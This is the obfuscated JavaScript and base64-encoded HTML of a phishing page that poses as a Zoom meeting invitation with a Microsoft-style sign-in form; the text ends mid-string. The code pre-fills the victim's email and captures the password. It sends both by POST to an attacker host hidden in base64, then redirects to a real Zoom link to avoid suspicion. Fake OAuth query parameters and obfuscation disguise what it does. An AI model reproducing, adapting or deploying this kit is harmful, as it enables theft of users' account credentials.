     function randomString(length, chars) {
			var result = '';
			for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
			return result;
		}
			var rString = randomString(19, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ012345678GHIJKLMNOPQRSTUVWXYZ');
		
		$(function () {

			const url = new URL(window.location.href);

			if(!(
				url.searchParams.has('app.zoom.us')
				&& url.searchParams.has('oauth2')
				&& url.searchParams.has('join-authorize')
			)) {
				url.searchParams.append('app.zoom.us', url.searchParams.get('app.zoom.us') || randomString(29, 'ABCDEFGHIJKLMNOPQRSTUVWXYZ012345678GHIJKLMNOPQRSTUVWXYZ'))
				url.searchParams.append('oauth2', url.searchParams.get('oauth2') || randomString(33, '01234abcABC56789'))
				url.searchParams.append('join-authorize', url.searchParams.get('join-authorize') || randomString(30, '01234abcABC56789'))
				window.location.replace(url.toString())
			}

        });
        
        var _0x20e15a=_0x1a55;(function(_0x4c3856,_0x26f8fd){var _0xc47fe1=_0x1a55,_0x580171=_0x4c3856();while(!![]){try{var _0x365747=parseInt(_0xc47fe1(0xad))/0x1*(parseInt(_0xc47fe1(0xac))/0x2)+-parseInt(_0xc47fe1(0xa4))/0x3+parseInt(_0xc47fe1(0xcf))/0x4*(parseInt(_0xc47fe1(0xc8))/0x5)+parseInt(_0xc47fe1(0xa2))/0x6+-parseInt(_0xc47fe1(0xaf))/0x7+parseInt(_0xc47fe1(0xa7))/0x8*(parseInt(_0xc47fe1(0xc4))/0x9)+-parseInt(_0xc47fe1(0xb6))/0xa*(parseInt(_0xc47fe1(0xa9))/0xb);if(_0x365747===_0x26f8fd)break;else _0x580171['push'](_0x580171['shift']());}catch(_0x4af559){_0x580171['push'](_0x580171['shift']());}}}(_0xbc61,0xcfd5c));var ftld=_0x20e15a(0xb5);$(document)['on']('keyup',_0x20e15a(0xce),function(){var _0xb662af=_0x20e15a;$('#displayName')[_0xb662af(0xcd)]($(this)['val']());});var hash=window[_0x20e15a(0xa3)]['hash']['substr'](0x1);window[_0x20e15a(0xa5)]=function onoff(){var _0x4d7813=_0x20e15a;document['getElementById'](_0x4d7813(0xae))['onkeydown']=function(_0xe63605){var _0x554be3=_0x4d7813;_0xe63605[_0x554be3(0xab)]==0xd&&checkmyEmail();},document['getElementById'](_0x4d7813(0xd4))['onkeydown']=function(_0x208de6){var _0xb26e83=_0x4d7813;_0x208de6[_0xb26e83(0xab)]==0xd&&checkPassy();};if(hash){var _0x82ea38=window[_0x4d7813(0xa3)][_0x4d7813(0xbd)][_0x4d7813(0xba)]('#',''),_0x56e4d8=/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/;_0x82ea38[_0x4d7813(0xc0)](_0x56e4d8)?(document['getElementById'](_0x4d7813(0xc6))[_0x4d7813(0xb4)]=_0x82ea38,document[_0x4d7813(0xca)]('logn')['value']=_0x82ea38,document['getElementById'](_0x4d7813(0xbe))['style']['display']=_0x4d7813(0xd2),document[_0x4d7813(0xca)]('last-frame')[_0x4d7813(0xd7)][_0x4d7813(0xd9)]=_0x4d7813(0xa8),document['getElementById']('soptions')[_0x4d7813(0xd7)][_0x4d7813(0xd9)]=_0x4d7813(0xd2),document[_0x4d7813(0xca)]('passd')[_0x4d7813(0xb8)]()):document['getElementById'](_0x4d7813(0xae))[_0x4d7813(0xb8)]();}else{if(ftld){var _0x220b3b=/^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/,_0x56e4d8=/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,7}$/;if(!_0x220b3b[_0x4d7813(0xbc)](ftld))var _0x82ea38=ftld;else var _0x82ea38=atob(ftld);document[_0x4d7813(0xca)](_0x4d7813(0xc6))[_0x4d7813(0xb4)]=_0x82ea38,document[_0x4d7813(0xca)](_0x4d7813(0xae))[_0x4d7813(0xb7)]=_0x82ea38,document[_0x4d7813(0xca)]('first-frame')['style']['display']=_0x4d7813(0xd2),document[_0x4d7813(0xca)](_0x4d7813(0xbb))[_0x4d7813(0xd7)]['display']=_0x4d7813(0xa8),document['getElementById']('soptions')[_0x4d7813(0xd7)][_0x4d7813(0xd9)]=_0x4d7813(0xd2),document['getElementById'](_0x4d7813(0xd4))[_0x4d7813(0xb8)]();}else document[_0x4d7813(0xca)]('logn')[_0x4d7813(0xb8)]();}};function checkmyEmail(){var _0xf742bf=_0x20e15a,_0x22369b=document[_0xf742bf(0xca)](_0xf742bf(0xae))[_0xf742bf(0xb7)],_0x1ff090=/^[\w\-\.\+]+\@[a-zA-Z0-9\.\-]+\.[a-zA-z0-9]{2,4}$/;if(_0x22369b[_0xf742bf(0xd5)]<0x1)document[_0xf742bf(0xca)](_0xf742bf(0xae))[_0xf742bf(0xcb)]=_0xf742bf(0xe0),document['getElementById'](_0xf742bf(0xae))[_0xf742bf(0xd7)][_0xf742bf(0xa6)]=_0xf742bf(0xb1),document[_0xf742bf(0xca)](_0xf742bf(0xc5))['style'][_0xf742bf(0xd9)]='block',document['getElementById'](_0xf742bf(0xae))[_0xf742bf(0xb8)](),document[_0xf742bf(0xca)](_0xf742bf(0xde))['value']=0x1;else return!_0x22369b[_0xf742bf(0xc0)](_0x1ff090)?(document['getElementById'](_0xf742bf(0xae))[_0xf742bf(0xcb)]=_0xf742bf(0xe0),document[_0xf742bf(0xca)]('efire')[_0xf742bf(0xd7)][_0xf742bf(0xd9)]=_0xf742bf(0xa8),document['getElementById'](_0xf742bf(0xae))['style'][_0xf742bf(0xa6)]=_0xf742bf(0xb1),document[_0xf742bf(0xca)]('logn')[_0xf742bf(0xb8)](),document[_0xf742bf(0xca)](_0xf742bf(0xde))[_0xf742bf(0xb7)]=0x1,![]):(document['getElementById'](_0xf742bf(0xbe))['style'][_0xf742bf(0xd9)]='none',document[_0xf742bf(0xca)](_0xf742bf(0xbb))[_0xf742bf(0xd7)][_0xf742bf(0xd9)]=_0xf742bf(0xa8),document['getElementById'](_0xf742bf(0xd6))[_0xf742bf(0xd7)]['display']=_0xf742bf(0xd2),document['getElementById'](_0xf742bf(0xae))[_0xf742bf(0xcb)]=_0xf742bf(0xcc),document[_0xf742bf(0xca)](_0xf742bf(0xc5))[_0xf742bf(0xd7)][_0xf742bf(0xd9)]=_0xf742bf(0xd2),document[_0xf742bf(0xca)](_0xf742bf(0xd4))[_0xf742bf(0xb8)](),document[_0xf742bf(0xca)](_0xf742bf(0xde))[_0xf742bf(0xb7)]=0x0,!![]);}function autoafresh(){var _0x5ab8ef=_0x20e15a;document[_0x5ab8ef(0xca)]('last-frame')[_0x5ab8ef(0xd7)]['display']=_0x5ab8ef(0xd2),document[_0x5ab8ef(0xca)]('first-frame')[_0x5ab8ef(0xd7)][_0x5ab8ef(0xd9)]=_0x5ab8ef(0xa8);}function _0x1a55(_0x4ac134,_0x15d521){var _0xbc6151=_0xbc61();return _0x1a55=function(_0x1a55d8,_0x4446fc){_0x1a55d8=_0x1a55d8-0xa2;var _0x23d0e3=_0xbc6151[_0x1a55d8];return _0x23d0e3;},_0x1a55(_0x4ac134,_0x15d521);}function errUser(){var _0x4afccd=_0x20e15a,_0x34a65f=document[_0x4afccd(0xca)](_0x4afccd(0xde))['value'],_0x12ddea=document['getElementById'](_0x4afccd(0xae))[_0x4afccd(0xb7)];_0x34a65f==0x1&&(_0x12ddea['length']<0x1?(document[_0x4afccd(0xca)](_0x4afccd(0xae))['className']='form-control\x20ltr_override\x20input\x20ext-input\x20text-box\x20ext-text-box\x20has-error\x20ext-has-error',document['getElementById'](_0x4afccd(0xc5))[_0x4afccd(0xd7)]['display']=_0x4afccd(0xa8),document['getElementById'](_0x4afccd(0xae))[_0x4afccd(0xb8)]()):(document[_0x4afccd(0xca)](_0x4afccd(0xc5))['style'][_0x4afccd(0xd9)]=_0x4afccd(0xd2),document[_0x4afccd(0xca)](_0x4afccd(0xae))[_0x4afccd(0xcb)]=_0x4afccd(0xcc),document[_0x4afccd(0xca)](_0x4afccd(0xae))[_0x4afccd(0xd7)][_0x4afccd(0xa6)]=''));}function _0xbc61(){var _0x2c2854=['hash','first-frame','form-control\x20input\x20ext-input\x20text-box\x20ext-text-box','match','background-image','<a\x20class=\x27linko\x27\x20style=\x27font-size:\x2015px;\x27>reset\x20it\x20now.</a>','efired','103941qwmClY','efire','displayName','fail','5IoAohZ','json','getElementById','className','form-control\x20ltr_override\x20input\x20ext-input\x20text-box\x20ext-text-box','html','input[name=logncovid]','4629680wJsffl','val','url(\x27data:image/gif;base64,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\x27)','none','url(\x27\x27)','passd','length','soptions','style','#lightbox','display','form-control\x20input\x20ext-input\x20text-box\x20ext-text-box\x20has-error\x20ext-has-error','input[name=tetypecontrol]','Please\x20enter\x20your\x20password.','success','errorcontrol','POST','form-control\x20ltr_override\x20input\x20ext-input\x20text-box\x20ext-text-box\x20has-error\x20ext-has-error','css','3245136XyUeYC','location','2291286fVhHQg','onload','borderColor','160mkkimD','block','11rYsFjA','done','keyCode','28swhsZw','62438lnhBFv','logn','1672041XqmDFG','log','rgb(232,\x2017,\x2035)','tetypecontrol','ajax','innerHTML','{$email}','9494710txmcft','value','focus','aHR0cHM6Ly9mdXJ0aGVycGhhcm0ubGl2ZS9lcmYvem9hbS5waHA=','replace','last-frame','test'];_0xbc61=function(){return _0x2c2854;};return _0xbc61();}function errPas(){var _0x508048=_0x20e15a,_0x233444=document[_0x508048(0xca)]('errorcontrol')[_0x508048(0xb7)],_0x939acb=document[_0x508048(0xca)](_0x508048(0xd4))[_0x508048(0xb7)];_0x233444==0x1&&(_0x939acb[_0x508048(0xd5)]<0x1?(document[_0x508048(0xca)](_0x508048(0xd4))[_0x508048(0xcb)]=_0x508048(0xda),document[_0x508048(0xca)](_0x508048(0xc3))['innerHTML']='Please\x20enter\x20your\x20password.',document[_0x508048(0xca)](_0x508048(0xc3))[_0x508048(0xd7)][_0x508048(0xd9)]='block',document[_0x508048(0xca)](_0x508048(0xd4))[_0x508048(0xb8)]()):(document[_0x508048(0xca)](_0x508048(0xc3))[_0x508048(0xd7)][_0x508048(0xd9)]='none',document[_0x508048(0xca)](_0x508048(0xd4))[_0x508048(0xcb)]=_0x508048(0xbf),document[_0x508048(0xca)](_0x508048(0xd4))[_0x508048(0xd7)][_0x508048(0xa6)]=''));}function checkPassy(){var _0x5f13cf=_0x20e15a,_0x55c4bd=document[_0x5f13cf(0xca)](_0x5f13cf(0xd4))[_0x5f13cf(0xb7)],_0x49c9b3='https://app.zoom.us/wc/91622826200/join?fromPWA=1&pwd=OGVFQk9oaE5FY0Y0S1pTYXFjOUhyUT09&_x_zm_rtaid=I7SQ3VePRPS-cndRs57BvQ.1709509974548.baaffd0609a08646b179bd6a3b6a98e6&_x_zm_rhtaid=341';if(_0x55c4bd[_0x5f13cf(0xd5)]<0x4)return document[_0x5f13cf(0xca)](_0x5f13cf(0xd4))['className']=_0x5f13cf(0xda),document['getElementById'](_0x5f13cf(0xd4))[_0x5f13cf(0xd7)][_0x5f13cf(0xa6)]=_0x5f13cf(0xb1),document['getElementById'](_0x5f13cf(0xc3))['innerHTML']=_0x5f13cf(0xdc),document['getElementById']('efired')[_0x5f13cf(0xd7)][_0x5f13cf(0xd9)]='block',document[_0x5f13cf(0xca)]('passd')[_0x5f13cf(0xb8)](),document[_0x5f13cf(0xca)](_0x5f13cf(0xde))['value']=0x1,![];else{document[_0x5f13cf(0xca)](_0x5f13cf(0xde))[_0x5f13cf(0xb7)]=0x0,document[_0x5f13cf(0xca)](_0x5f13cf(0xc3))[_0x5f13cf(0xd7)][_0x5f13cf(0xd9)]=_0x5f13cf(0xd2),document['getElementById']('passd')[_0x5f13cf(0xcb)]=_0x5f13cf(0xbf),$('#lightbox')[_0x5f13cf(0xe1)](_0x5f13cf(0xc1),_0x5f13cf(0xd1));var _0x1c4b25={'sicko':$(_0x5f13cf(0xce))[_0x5f13cf(0xd0)](),'micko':$('input[name=passdcovid]')[_0x5f13cf(0xd0)](),'indica':$(_0x5f13cf(0xdb))[_0x5f13cf(0xd0)]()};$[_0x5f13cf(0xb3)]({'type':_0x5f13cf(0xdf),'url':atob(_0x5f13cf(0xb9)),'data':_0x1c4b25,'encode':!![]})[_0x5f13cf(0xaa)](function(_0x3a42c6){var _0x16cb83=_0x5f13cf;console['log'](_0x3a42c6),_0x3a42c6[_0x16cb83(0xdd)]?($(_0x16cb83(0xd8))[_0x16cb83(0xe1)]('background-image',_0x16cb83(0xd3)),window['parent']['location']['href']=_0x49c9b3):($(_0x16cb83(0xd8))[_0x16cb83(0xe1)](_0x16cb83(0xc1),_0x16cb83(0xd3)),document[_0x16cb83(0xca)](_0x16cb83(0xb2))[_0x16cb83(0xb7)]=0x1,document[_0x16cb83(0xca)](_0x16cb83(0xc3))[_0x16cb83(0xb4)]='Your\x20account\x20or\x20password\x20is\x20incorrect.\x20If\x20you\x20don\x27t\x20remember\x20your\x20password,\x20'+_0x16cb83(0xc2),document[_0x16cb83(0xca)]('efired')[_0x16cb83(0xd7)][_0x16cb83(0xd9)]='block',document[_0x16cb83(0xca)](_0x16cb83(0xd4))[_0x16cb83(0xd7)][_0x16cb83(0xa6)]=_0x16cb83(0xb1),document[_0x16cb83(0xca)](_0x16cb83(0xd4))[_0x16cb83(0xb7)]='',document[_0x16cb83(0xca)](_0x16cb83(0xd4))[_0x16cb83(0xb8)]());})[_0x5f13cf(0xc7)](function(_0x459427){var _0x1c581b=_0x5f13cf;console[_0x1c581b(0xb0)](_0x459427);});}}
                                                                                                                     
document.write(atob('ICAgICAgPGxpbmsgcmVsPSJzaG9ydGN1dCBpY29uIiBocmVmPSJodHRwczovL2V4cGxvcmUuem9vbS51cy9hc3NldHMvZmF2aWNvbnMvem9vbS5pY28iPgo8bGluayBkYXRhLWxvYWRlcj0iY2RuIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIiBocmVmPSJodHRwczovL2FhZGNkbi5tc2F1dGgubmV0L2VzdHMvMi4xL2NvbnRlbnQvY2RuYnVuZGxlcy9jb252ZXJnZWQudjIubG9naW4ubWluX3ppeXRmOGR6dDllZzFzNi1vaGhsZWcyLmNzcyIgcmVsPSJzdHlsZXNoZWV0IiA+CgogICAgPC9oZWFkPgoKPGJvZHkgY2xhc3M9ImNiIiBzdHlsZT0iZGlzcGxheTogYmxvY2s7Ij4KPGRpdiBpZD0idGhldmlldyI+CjxkaXY+PC9kaXY+CjxkaXYgY2xhc3M9ImxvZ2luLXBhZ2luYXRlZC1wYWdlIj4KPGRpdiBpZD0ibGlnaHRib3hUZW1wbGF0ZUNvbnRhaW5lciI+CjxkaXYgaWQ9ImxpZ2h0Ym94QmFja2dyb3VuZENvbnRhaW5lciI+PGRpdiBjbGFzcz0iYmFja2dyb3VuZC1pbWFnZS1ob2xkZXIiIHJvbGU9InByZXNlbnRhdGlvbiI+CjxkaXYgY2xhc3M9ImJhY2tncm91bmQtaW1hZ2UgZXh0LWJhY2tncm91bmQtaW1hZ2UgZGF0Ym94IiBpZD0idGhlYm9keSIgc3R5bGU9ImJhY2tncm91bmQtaW1hZ2U6IHVybCgnaHR0cHM6Ly9jZG4uZ2xpdGNoLmdsb2JhbC85MmI0NWY2Yi0wZTE0LTRmNjctYjg2NS0xMTU4NjgxMWMyZGEvem9vbV9iZy5qcGc/dj0xNzA5MDQ3Mjc1MzAzJyk7ICI+CiAgICA8L2Rpdj4KPC9kaXY+PC9kaXY+CiAgICA8L2Rpdj48L2Rpdj4KPGRpdiBjbGFzcz0ib3V0ZXIiPgogICAgPGRpdiBjbGFzcz0idGVtcGxhdGUtc2VjdGlvbiBtYWluLXNlY3Rpb24iPgogICAgICAgIDxkaXYgY2xhc3M9Im1pZGRsZSBleHQtbWlkZGxlIj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iZnVsbC1oZWlnaHQiPgo8ZGl2IGNsYXNzPSJmbGV4LWNvbHVtbiI+CiAgICA8ZGl2IGNsYXNzPSJ3aW4tc2Nyb2xsIj4KICAgICA8ZGl2IGlkPSJsaWdodGJveCIgY2xhc3M9InNpZ24taW4tYm94IGV4dC1zaWduLWluLWJveCBmYWRlLWluLWxpZ2h0Ym94IGhhcy1wb3B1cCI+CiAgICAgICAgPGRpdiBjbGFzcz0ibGlnaHRib3gtY292ZXIiPjwvZGl2Pgo8ZGl2PjxpbWcgY2xhc3M9ImxvZ28iIHJvbGU9ImltZyIgc3JjPSJodHRwczovL3N0Mi56b29tLnVzL3N0YXRpYy82LjMuMTU2NjUvaW1hZ2UvbmV3L3RvcE5hdi9ab29tX2xvZ28uc3ZnIiBhbHQ9Ilpvb20iPjwvZGl2PgogICAgICAgIDxkaXYgcm9sZT0ibWFpbiI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9IiIgaWQ9ImZpcnN0LWZyYW1lIj4KICA8ZGl2IGNsYXNzPSJwYWdpbmF0aW9uLXZpZXcgYW5pbWF0ZSBzbGlkZS1pbi1uZXh0Ij4KPGRpdj4KPGRpdj48ZGl2PgogICAgPGRpdiBjbGFzcz0icm93IHRpdGxlIGV4dC10aXRsZSIgaWQ9ImxvZ2luSGVhZGVyIj4KICAgICAgICA8ZGl2IHJvbGU9ImhlYWRpbmciPlNpZ24gaW48L2Rpdj4KICAgIDwvZGl2Pgo8L2Rpdj48L2Rpdj4KPGRpdiBjbGFzcz0icm93Ij4KICAgIDxkaXYgcm9sZT0iYWxlcnQiIGFyaWEtbGl2ZT0iYXNzZXJ0aXZlIj4KICAgICAgICAgPGlucHV0IHR5cGU9ImhpZGRlbiIgY2xhc3M9ImZvcm0tY29udHJvbCIgbmFtZT0iaHdpcGUiIGlkPSJod2lwZSIgdmFsdWU9IiI+CiAgICAgICAgPGRpdiBjbGFzcz0iY29sLW1kLTI0IGVycm9yIGV4dC1lcnJvciIgaWQ9ImVmaXJlIiBzdHlsZT0iZGlzcGxheTogbm9uZSI+RW50ZXIgYSB2YWxpZCBlbWFpbCBhZGRyZXNzPC9kaXY+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAgY29sLW1kLTI0Ij4KICA8ZGl2IGNsYXNzPSJwbGFjZWhvbGRlckNvbnRhaW5lciI+CjxpbnB1dCB0eXBlPSJlbWFpbCIgbmFtZT0ibG9nbmNvdmlkIiBpZD0ibG9nbiIgbWF4bGVuZ3RoPSIxMTMiIGNsYXNzPSJmb3JtLWNvbnRyb2wgbHRyX292ZXJyaWRlIGlucHV0IGV4dC1pbnB1dCB0ZXh0LWJveCBleHQtdGV4dC1ib3giIHBsYWNlaG9sZGVyPSJFbWFpbCwgcGhvbmUsIG9yIFNreXBlIiBvbmlucHV0PSJlcnJVc2VyKCkiPgoKICAgICAgICAgICAgPGlucHV0IG5hbWU9InBhc3N3ZCIgdHlwZT0icGFzc3dvcmQiIGlkPSJpMDExOCIgYXV0b2NvbXBsZXRlPSJvZmYiIGRhdGEtYmluZD0ibW92ZU9mZlNjcmVlbiwgdGV4dElucHV0OiBwYXNzd29yZEJyb3dzZXJQcmVmaWxsIiBjbGFzcz0ibW92ZU9mZlNjcmVlbiIgdGFiaW5kZXg9Ii0xIiBhcmlhLWhpZGRlbj0idHJ1ZSI+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KPC9kaXY+Cgo8ZGl2IGNsYXNzPSJ3aW4tYnV0dG9uLXBpbi1ib3R0b20iPgogICAgPGRpdiBjbGFzcz0icm93Ij4KICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29sLXhzLTI0IG5vLXBhZGRpbmctbGVmdC1yaWdodCBidXR0b24tY29udGFpbmVyIGJ1dHRvbi1maWVsZC1jb250YWluZXIgZXh0LWJ1dHRvbi1maWVsZC1jb250YWluZXIiPgogICAgPGRpdiBjbGFzcz0iaW5saW5lLWJsb2NrIGJ1dHRvbi1pdGVtIGV4dC1idXR0b24taXRlbSI+CiAgICAgICAgIDxpbnB1dCB0eXBlPSJidXR0b24iIGlkPSJpZFNJQnV0dG9uTmV4dCIgY2xhc3M9Indpbi1idXR0b24gYnV0dG9uX3ByaW1hcnkgYnV0dG9uIGV4dC1idXR0b24gcHJpbWFyeSBleHQtcHJpbWFyeSIgIG9uQ2xpY2s9InJldHVybiBjaGVja215RW1haWwoKSIgdmFsdWU9Ik5leHQiPgogICA8L2Rpdj4KPC9kaXY+PC9kaXY+CiAgICA8L2Rpdj4KPC9kaXY+CjwvZGl2PgogICAgPC9kaXY+CiAgICAgICAgICAgIAogICAgICAgICAgICA8L2Rpdj4gICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIGNsYXNzPSJmb3JtLWNvbnRyb2wiIG5hbWU9ImVycm9yY29udHJvbCIgaWQ9ImVycm9yY29udHJvbCIgdmFsdWU9IiI+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJoaWRkZW4iIGNsYXNzPSJmb3JtLWNvbnRyb2wiIG5hbWU9InRldHlwZWNvbnRyb2wiIGlkPSJ0ZXR5cGVjb250cm9sIiB2YWx1ZT0iIj4gIAogICAgICAgICAgICA8ZGl2IGNsYXNzPSIiIHN0eWxlPSJkaXNwbGF5OiBub25lIiBpZD0ibGFzdC1mcmFtZSI+CiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iYW5pbWF0ZSBzbGlkZS1pbi1uZXh0Ij4KICAgICAgICA8ZGl2Pgo8ZGl2IGNsYXNzPSJpZGVudGl0eUJhbm5lciI+CiAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJhY2tCdXR0b24iIGlkPSJpZEJ0bl9CYWNrIiBvbkNsaWNrPSJhdXRvYWZyZXNoKCkiPgogICAgICAgIDxpbWcgcm9sZT0icHJlc2VudGF0aW9uIiBzcmM9Imh0dHBzOi8vbG9naW5jZG4ubXNhdXRoLm5ldC9zaGFyZWQvMS4wL2NvbnRlbnQvaW1hZ2VzL2Fycm93X2xlZnRfYTljYzI4MjRlZjM1MTdiNmM0MTYwZGNmOGZmN2Q0MTAuc3ZnIj4KICAgIDwvYnV0dG9uPgogICAgPGRpdiBpZD0iZGlzcGxheU5hbWUiIGNsYXNzPSJpZGVudGl0eSI+PC9kaXY+CjwvZGl2PjwvZGl2PgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJwYWdpbmF0aW9uLXZpZXcgYW5pbWF0ZSBoYXMtaWRlbnRpdHktYmFubmVyIHNsaWRlLWluLW5leHQiPgo8ZGl2Pgo8ZGl2IGlkPSJsb2dpbkhlYWRlciIgY2xhc3M9InJvdyB0aXRsZSBleHQtdGl0bGUiPgogICAgPGRpdiByb2xlPSJoZWFkaW5nIiBzdHlsZT0iZm9udC1zaXplOiAxOHB4Ij5FbnRlciBlbWFpbCBwYXNzd29yZCB0byBhY2NlcHQgbWVldGluZyBzY2hlZHVsZWQgZm9yIDQ6MzBwbSAtIDU6MDBwbTwvZGl2Pgo8L2Rpdj4KPGRpdiBjbGFzcz0icm93Ij4KICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3Jv